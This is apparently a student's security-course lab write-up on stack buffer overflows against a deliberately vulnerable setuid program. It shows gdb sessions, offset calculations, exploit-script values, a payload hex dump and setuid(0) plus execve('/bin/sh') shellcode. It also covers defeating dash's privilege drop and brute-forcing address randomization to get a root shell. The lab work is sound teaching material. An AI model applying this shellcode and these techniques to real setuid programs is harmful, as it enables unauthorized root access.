# Cloning repo and preparing submission directories
In screenshot1.png , for first task date is not show as it would expose personal access token please forgive
we succesfully show 
<img width="818" alt="jbg469-screenshot1" src="https://user-images.githubusercontent.com/72175659/155915203-5aea8289-60a1-4883-ac6a-396e38d5495e.png">

a local repo is created 
In screenshot2 we show Reports/Artifacts succesfully created for submission. 
<img width="976" alt="jbg469-screenshot2" src="https://user-images.githubusercontent.com/72175659/155915238-6e557206-4d07-418d-9c0b-ac889f3b63bf.png">

In screenshots2.1-2.2 we show commands executed to turn off countermeasures

<img width="980" alt="jbg469-screenshot2 1" src="https://user-images.githubusercontent.com/72175659/155915260-568c2b01-10d3-4b19-b357-a994f40b48d2.png">
<img width="947" alt="jbg469-screenshot2 2" src="https://user-images.githubusercontent.com/72175659/155915263-99f5d63e-ecd7-44ab-a7a5-287a6eeac0f1.png">


# Invoking the shellcode
After typing make on shellcode directory as shown in screenshot3.4 we see the following commands execute 
<img width="952" alt="jbg469-screenshot3 4" src="https://user-images.githubusercontent.com/72175659/155915316-5346e170-5e12-4b0e-8e39-25d02bc4f54d.png">

```
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
```

We run ./a32.out and ./a64.out nothing appears on the terminal, we type exit to return to a functional shell. as shown in screenshot3.4.1 and 3.4.2
<img width="1063" alt="jbg469-screenshot3 4 1" src="https://user-images.githubusercontent.com/72175659/155915348-cd80c972-6de9-42fb-9584-1e079eb9e6e5.png">
<img width="1052" alt="jbg469-screenshot3 4 2" src="https://user-images.githubusercontent.com/72175659/155915359-d6263369-3c27-4304-90c4-dcd39c751bad.png">


# Task 4 understanding the vulnerable program
After understanding the vulnerable program we execute make command as shown in screenshot4 and we are ready to investigate.
<img width="1045" alt="jbg469-screenshot4" src="https://user-images.githubusercontent.com/72175659/155915379-c3a22925-e5fc-43d7-8958-871772a85071.png">

# Launching and investigation of 32 bit attack

The following is the output from our gdb commands as shown in screenshots5-5.1:
<img width="1037" alt="jbg469-screenshot5" src="https://user-images.githubusercontent.com/72175659/155915416-f1ea8426-1dbc-49ad-9e2e-06b47d1f58f6.png">

<img width="1054" alt="jbg469-screenshot5 1" src="https://user-images.githubusercontent.com/72175659/155915429-e6a47cc2-2bb7-4511-9b06-4d502e4bb4e0.png">


```
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
Starting program: /home/nyuappsec/AppSec1/Part1/code/stack-L1-dbg 
Input size: 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffcb48 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcf30 --> 0xf7fb4000 --> 0x1ead6c 
ESI: 0xf7fb4000 --> 0x1ead6c 
EDI: 0xf7fb4000 --> 0x1ead6c 
EBP: 0xffffcf38 --> 0xffffd168 --> 0x0 
ESP: 0xffffcb2c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x74
[------------------------------------stack-------------------------------------]
0000| 0xffffcb2c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
0004| 0xffffcb30 --> 0xffffcf53 --> 0x456 
0008| 0xffffcb34 --> 0x0 
0012| 0xffffcb38 --> 0x3e8 
0016| 0xffffcb3c --> 0x565563c3 (<dummy_function+19>:	add    eax,0x2bf5)
0020| 0xffffcb40 --> 0x0 
0024| 0xffffcb44 --> 0x0 
0028| 0xffffcb48 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcf53 "V\004") at stack.c:16
16	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcf30 --> 0xf7fb4000 --> 0x1ead6c 
ESI: 0xf7fb4000 --> 0x1ead6c 
EDI: 0xf7fb4000 --> 0x1ead6c 
EBP: 0xffffcb28 --> 0xffffcf38 --> 0xffffd168 --> 0x0 
ESP: 0xffffcab0 ("1pUVD\317\377\377\220\325\377\367\340\223\374", <incomplete sequence \367>)
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x74
   0x565562b8 <bof+11>:	call   0x565563f7 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x6c]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcab0 ("1pUVD\317\377\377\220\325\377\367\340\223\374", <incomplete sequence \367>)
0004| 0xffffcab4 --> 0xffffcf44 --> 0x0 
0008| 0xffffcab8 --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0012| 0xffffcabc --> 0xf7fc93e0 --> 0xf7ffd990 --> 0x56555000 --> 0x464c457f 
0016| 0xffffcac0 --> 0x0 
0020| 0xffffcac4 --> 0x0 
0024| 0xffffcac8 --> 0x0 
0028| 0xffffcacc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
20	    strcpy(buffer, str);  
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb28
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcabc
```

Since we want to overflow buffer we need to find the offset between buffer and the top of the stack ebp we do this by.
```
nyuappsec@ubuntu:~$ python3
Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xffffcb28-0xffffcabc)
'0x6c' or 108 bits apart in the stack. 
```
In the exploit-32.py file we edit the following values 

```
start = 517-len(shellcode)   # start from len(shellcode) from the end of array
ret = 0xffffcabc + 250       # return beyond ebp / NOP sled
offset = 108 + 4             #ebp-&buffer+4
```
This works because our vulnerable program has a buffer that takes up 108 bytes, we will then read the previous frames pointer and land in the return adress where
it would without the exploit run the existing code. We want to write more than the buffer of 108 bytes to run out malicious code without running code that is already in the stack. Filling it with NOPs allows us to do this. Adding 250 bytes to the buffer gives us plenty of room to land somewhere in the NOP sled to get the return adress we want to execute the malicious code. 
```
--contents of badfile--
00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
*
00000070  b6 cb ff ff 90 90 90 90  90 90 90 90 90 90 90 90  |................|
00000080  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
*
000001e0  90 90 90 90 90 90 90 90  90 90 31 c0 50 68 2f 2f  |..........1.Ph//|
000001f0  73 68 68 2f 62 69 6e 89  e3 50 53 89 e1 31 d2 31  |shh/bin..PS..1.1|
00000200  c0 b0 0b cd 80                                    |.....|
00000205
#     
```
stack-L1 is a setuid program 
```
# ls -l stack-L1                                                               
-rwsr-xr-x 1 root nyuappsec 15908 Feb  8 13:44 stack-L1
```
so it will run what is in the buffer, because of the badfile created by the exploit; the program will run the shellcode with root permissions. See screenshot5.2

<img width="1035" alt="jbg469-screenshot5 2" src="https://user-images.githubusercontent.com/72175659/155915514-57eb188b-48ba-4343-a5d4-825198280bbb.png">


# Launching attack on 64 bit
First we must conduct an investgation on stack-L3-dbg
Using gdb we can see that $rbp and &buffer for stack-L3_dbg is the following.
```
db-peda$ p $rbp
$1 = (void *) 0x7fffffffd960

gdb-peda$ p &buffer
$3 = (char (*)[200]) 0x7fffffffd890
gdb-peda$ 

```
See screenshot6-6.1

<img width="1039" alt="jbg469-screenshot6" src="https://user-images.githubusercontent.com/72175659/155915538-2ae4db25-cb49-4bb4-9922-37b55e272435.png">
<img width="1031" alt="jbg469-screenshot6 1" src="https://user-images.githubusercontent.com/72175659/155915544-d9af5450-ab5f-4236-9c4b-4e0680c744b2.png">

In our exploit-64.py we change the shellcode to the 64 bit version provided in the shellcode directory 
as seen in screenshot6.2 we find the offset of rbp and &buffer to be d0 or 208 bytes

<img width="991" alt="jbg469-screenshot6 2" src="https://user-images.githubusercontent.com/72175659/155915560-77d4c67c-6a36-4941-988d-33f288cc942d.png">

For 64 bit we must put the shellcode at the start becuase zeros will terminate if strpcy() is used in the case to 64 bit adress leading zeroes. Since we should place our shellcode at the beggining of bufffer setting the return adress to  &buffer or  0x7fffffffd890 +160  should land us somewhere in the Nopsled. 

```
start = 90   # Change this number 
Decide the return address value 
and put it somewhere in the payload
#$rbp - &buffer = 208
ret =  0x7fffffffd890 + 160 # tried 100, 208 didn't work 150 and 160 did
offset = 208 + 8
```
when we add 100 to ret we get segmentation fault (not far enough into the payload) 
when we add 208 we get illegal operation  (too far away)
150 is good (in range of NOPS)
160 is good (in range of NOPS)
In screenshot6.3 we see successful 64bit exploit

<img width="1032" alt="jbg469-screenshot6 3" src="https://user-images.githubusercontent.com/72175659/155915637-b7492677-2cc0-4b31-a4fa-3b6fdb178d19.png">

# Defeating dash's Countermeasure
In screenshot 7 we turn on the coutermeasure

<img width="1033" alt="jbg469-screenshot7" src="https://user-images.githubusercontent.com/72175659/155915671-8e40ff9c-4acd-4838-bfed-66c9289a09f9.png">

After adding setuid(0) invocation binary to the beggining of shellcode in call_shellcode.c and running a32.out, a64.out
we get a root shell as expected. See screenshot 7.1. 

<img width="1036" alt="jbg469-screenshot7 1" src="https://user-images.githubusercontent.com/72175659/155915691-dbc48dbf-f1c0-499c-99e0-001ddca7e95d.png">
<img width="1049" alt="jbg469-screenshot7 1 1" src="https://user-images.githubusercontent.com/72175659/155915735-d78977e9-048b-4ca4-b64b-fefd66022091.png">


If we dont add setuid(0) shellcoude to exploit-32.py, exploit does not work with countermeasure turned and we get a Segmentation fault error.
Adding setuid(0) binary to exploit-32.py we now have


```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80" 	
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

```
we rm badfile from previous exploits and run ./exploit-32.py then run ./stackL1. 
exploit works with countermeasures turned on see screenshot7.2.

<img width="1033" alt="jbg469-screenshot7 2" src="https://user-images.githubusercontent.com/72175659/155915757-61165f5d-2cfb-47ba-97ce-27f436525a55.png">

# Defeating Address Randomization
In screenshot8 we see we turn on adress randomization 

<img width="1037" alt="jbg469-screenshot8" src="https://user-images.githubusercontent.com/72175659/155915792-81ae8509-48b7-4859-bc4d-1be33892dbe4.png">

After 73 minutes we defeat it with exploit-32.py See screenshot8.1. That's speed 😎 👌🏼

<img width="1029" alt="jbg469-screenshot8 1" src="https://user-images.githubusercontent.com/72175659/155915872-f37ef939-15f3-42e5-941d-0573eb2f5374.png">

# Experimenting with Other Countermeasures
As we can see in screenshot 9 we turn on AR and exploit works
In screenshot9.1 we see that compiling stack.c without the flag exploit fails.

<img width="1043" alt="jbg469-screenshot9 1" src="https://user-images.githubusercontent.com/72175659/155915900-68c52462-2748-49f4-9e68-702f2afb5e39.png">

In screenshot9.2 we see that compiling call_shellcode.c without executable stack causes segmentation fault

<img width="1038" alt="jbg469-screenshot9 2" src="https://user-images.githubusercontent.com/72175659/155915910-b6f41d71-d9ad-49c4-9d38-469a937837bb.png">

The edited Makefile for both cases have been added to the repo

